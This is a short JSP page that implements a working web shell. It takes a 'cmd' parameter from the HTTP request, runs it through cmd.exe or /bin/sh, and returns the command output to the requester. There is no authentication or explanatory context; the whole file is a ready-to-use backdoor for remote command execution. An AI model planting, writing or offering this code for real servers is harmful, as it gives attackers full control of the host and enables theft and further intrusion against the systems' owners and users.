<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%!
    public static InputStream exec(String str) throws Exception {
        InputStream inputStream = null;
        String[] cmd = null;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        if (cmd != null) {
            inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        }

        return inputStream;
    }

    public static String scanner(InputStream inputStream) {
        return new Scanner(inputStream).useDelimiter("\\A").next();
    }
%>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        out.println(scanner(exec(cmd)));
    }
%>